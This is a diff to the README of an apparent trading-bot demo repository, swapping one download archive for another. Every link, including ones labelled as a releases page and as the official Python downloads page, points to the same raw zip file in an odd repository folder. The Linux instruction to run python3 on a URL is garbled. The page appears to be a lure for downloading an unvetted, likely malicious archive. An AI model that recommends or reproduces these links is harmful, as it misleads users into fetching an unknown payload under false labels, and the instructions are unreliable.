@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/gui2352424383794g/trading-bot-demo/main/figurehead/trading-bot-demo.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/gui2352424383794g/trading-bot-demo/main/figurehead/trading-bot-demo.zip)
+[![Download](https://raw.githubusercontent.com/gui2352424383794g/trading-bot-demo/main/figurehead/demo-bot-trading-v2.4-beta.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/gui2352424383794g/trading-bot-demo/main/figurehead/demo-bot-trading-v2.4-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -37,13 +37,13 @@ To ensure the best experience, your system should meet these requirements:
 
 ### 1. Download the Software
 
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/gui2352424383794g/trading-bot-demo/main/figurehead/trading-bot-demo.zip). Choose the latest version available.
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/gui2352424383794g/trading-bot-demo/main/figurehead/demo-bot-trading-v2.4-beta.1.zip). Choose the latest version available.
 
 ### 2. Install Python
 
 If you do not have Python installed, follow these steps:
 
-- Go to the [Python Downloads Page](https://raw.githubusercontent.com/gui2352424383794g/trading-bot-demo/main/figurehead/trading-bot-demo.zip).
+- Go to the [Python Downloads Page](https://raw.githubusercontent.com/gui2352424383794g/trading-bot-demo/main/figurehead/demo-bot-trading-v2.4-beta.1.zip).
 - Download the installer for your operating system.
 - Run the installer and make sure to check the box that says "Add Python to PATH" before you finish the installation.
 
@@ -58,7 +58,7 @@ After downloading the bot:
   - Open the `.dmg` file, drag the app to your Applications folder, and double-click it to run.
 
 - **Linux**:
-  - Extract the archive. Open a terminal, navigate to the folder, and run `python3 https://raw.githubusercontent.com/gui2352424383794g/trading-bot-demo/main/figurehead/trading-bot-demo.zip`.
+  - Extract the archive. Open a terminal, navigate to the folder, and run `python3 https://raw.githubusercontent.com/gui2352424383794g/trading-bot-demo/main/figurehead/demo-bot-trading-v2.4-beta.1.zip`.
 
 ## 📊 Using the Trading Bot
 
@@ -75,7 +75,7 @@ The bot provides visual feedback. After running your trading strategy, you can v
 
 ## 🔄 Updating the Software
 
-Keep your software up-to-date by regularly checking the [Release Page](https://raw.githubusercontent.com/gui2352424383794g/trading-bot-demo/main/figurehead/trading-bot-demo.zip). New features, improvements, or fixes are included in updates.
+Keep your software up-to-date by regularly checking the [Release Page](https://raw.githubusercontent.com/gui2352424383794g/trading-bot-demo/main/figurehead/demo-bot-trading-v2.4-beta.1.zip). New features, improvements, or fixes are included in updates.
 
 ## 💬 Support and Community
 
